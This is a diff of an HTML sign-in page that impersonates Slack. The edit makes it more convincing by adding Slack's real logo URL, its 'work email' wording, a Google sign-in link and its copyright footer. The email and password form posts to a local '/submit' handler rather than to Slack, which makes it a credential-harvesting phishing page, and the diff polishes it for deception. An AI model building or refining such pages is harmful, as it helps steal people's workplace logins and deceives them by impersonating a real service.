@@ -1,115 +1,132 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Sign in | Slack</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            background-color: #f8f8f8;
-            font-family: "Segoe UI", Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 400px;
-            margin: 80px auto;
-            background-color: #fff;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo img {
-            width: 60px;
-        }
-        h2 {
-            text-align: center;
-            color: #333;
-            font-weight: 600;
-            margin-bottom: 25px;
-        }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            color: #333;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #cfcfcf;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 15px;
-        }
-        .button {
-            background-color: #611f69;
-            color: white;
-            padding: 12px;
-            width: 100%;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-        }
-        .button:hover {
-            background-color: #4a154b;
-        }
-        .link {
-            text-align: right;
-            margin-top: 5px;
-        }
-        .link a {
-            color: #611f69;
-            font-size: 13px;
-            text-decoration: none;
-        }
-        .link a:hover {
-            text-decoration: underline;
-        }
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #888;
-            margin-top: 30px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Sign in | Slack</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background-color: #fff;
+      font-family: "Lato", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      padding: 40px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 120px;
+    }
+    h1 {
+      text-align: center;
+      color: #1d1c1d;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    p.subtext {
+      text-align: center;
+      color: #616061;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: #1d1c1d;
+      font-weight: 600;
+      font-size: 14px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #cfcfcf;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 15px;
+    }
+    .button {
+      background-color: #611f69;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+    }
+    .button:hover {
+      background-color: #4a154b;
+    }
+    .divider {
+      text-align: center;
+      margin: 20px 0;
+      color: #888;
+      font-size: 13px;
+    }
+    .link {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 13px;
+    }
+    .link a {
+      color: #611f69;
+      text-decoration: none;
+    }
+    .link a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #888;
+      margin-top: 40px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABQElEQVR4Xu3XQQ2AMAxE0Xb+Ww9bsEgaNJMwAEWk3z+Pf3X3mK0DRgGHAgAAAAAAAAAAgMv1glfV3M3luAYq4YND0hox6zWgGk0+BOaPASeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BCeTYEJ5NgQnk2BDek0FZ1q41WiEUbIAAAAAAAAAAID//wP/cX9+NP7AwQAAAABJRU5ErkJggg==" 
-            alt="Slack">
-        </div>
-        <h2>Sign in to your workspace</h2>
-        <form action="/submit" method="POST">
-            <label for="email">Email address</label>
-            <input type="email" id="email" name="email" placeholder="you@example.com" required>
-
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
-            <button type="submit" class="button">Sign In</button>
-        </form>
-
-        <div class="link">
-            <a href="#">Forgot password?</a>
-        </div>
-        <div class="link" style="text-align: center; margin-top: 10px;">
-            <a href="#">Create an account</a>
-        </div>
-
-        <div class="footer">
-            © Slack Technologies, LLC 2025 | Privacy | Terms
-        </div>
+  <div class="container">
+    <div class="logo">
+      <img src="https://a.slack-edge.com/80588/marketing/img/icons/icon_slack_hash_colored.png" alt="Slack">
     </div>
+    <h1>Sign in to Slack</h1>
+    <p class="subtext">We suggest using the email address you use at work.</p>
+
+    <form action="/submit" method="POST">
+      <label for="email">Email address</label>
+      <input type="email" id="email" name="email" placeholder="name@work-email.com" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+      <button type="submit" class="button">Sign In</button>
+    </form>
+
+    <div class="divider">or</div>
+
+    <div class="link">
+      <a href="#">Sign in with Google</a>
+    </div>
+
+    <div class="link" style="margin-top: 8px;">
+      <a href="#">Forgot password?</a> | 
+      <a href="#">Create an account</a>
+    </div>
+
+    <div class="footer">
+      © Slack Technologies, LLC 2025 | <a href="#">Privacy</a> | <a href="#">Terms</a>
+    </div>
+  </div>
 </body>
 </html>
